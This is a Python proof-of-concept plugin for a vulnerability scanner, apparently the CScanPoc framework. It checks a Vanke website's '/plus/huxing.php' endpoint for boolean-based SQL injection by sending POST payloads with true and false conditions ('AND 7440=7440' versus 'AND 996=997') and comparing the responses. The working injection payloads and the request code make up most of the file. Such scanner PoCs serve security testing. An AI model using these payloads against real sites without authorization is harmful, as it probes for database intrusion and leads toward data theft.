# coding:utf-8
from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Vanke_0101'  # 平台漏洞编号
    name = '万科存在SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2016-05-09'  # 漏洞公布时间
    desc = '''
    万科存在SQL注入漏洞，攻击者可以通过构造恶意语句来读取系统敏感文件信息。
    '''  # 漏洞描述
    ref = 'Unknown'  # 漏洞来源https://wooyun.shuimugan.com/bug/view?bug_no=204263
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Vanke'  # 漏洞组件名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '28f8f73b-8d22-4e96-bb06-42e5f4a26f87'  # 平台 POC 编号
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-06-27'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }
                    
    def verify(self):
        self.target = self.target.rstrip('/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            url = self.target + "/plus/huxing.php"
            payload = "Indextop1%24am=-1' AND 7440=7440 or 'cscan'=' &Indextop2%24am=%e7%89%a9%e4%b8%9a%e7%b1%bb%e5%9e%8b&Indextop3%24am=%e6%88%bf%e5%b1%8b%e7%bb%93%e6%9e%84"
            payload1 = "Indextop1%24am=-1' AND 996=997 or 'cscan'=' &Indextop2%24am=%e7%89%a9%e4%b8%9a%e7%b1%bb%e5%9e%8b&Indextop3%24am=%e6%88%bf%e5%b1%8b%e7%bb%93%e6%9e%84"
            headers = {
                "Content-Length": "185",
                "Content-Type": "application/x-www-form-urlencoded",
                "X-Requested-With": "XMLHttpRequest",
                "Cookie": "Hm_lvt_4594cb13792a2210768c46b3b9a400f6=1461823046,1461823200,1461823405; Hm_lpvt_4594cb13792a2210768c46b3b9a400f6=1461823405; Hm_lvt_353977b52c19bf7109508b2e22558f75=1461823046,1461823046,1461823200,1461823405; Hm_lpvt_353977b52c19bf7109508b2e22558f75=1461823405; HMVT=4594cb13792a2210768c46b3b9a400f6|1461823049|; HMACCOUNT=C00F59C0AEC2507E; BAIDUID=3A20E45316543F3C07F64876E5970FB1:FG=1; CNZZDATA1254164277=1725960874-1461823274-http%253A%252F%252Fwww.acunetix-referrer.com%252F%7C1461823274",
                "Connection": "Keep-alive",
                "Accept-Encoding": "gzip,deflate",
                "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.21 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.21",
                "Accept": "*/*"
            }
            _response = requests.post(url, data=payload, headers=headers)
            _response1 = requests.post(url, data=payload1, headers=headers)
            if _response.text != _response1.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
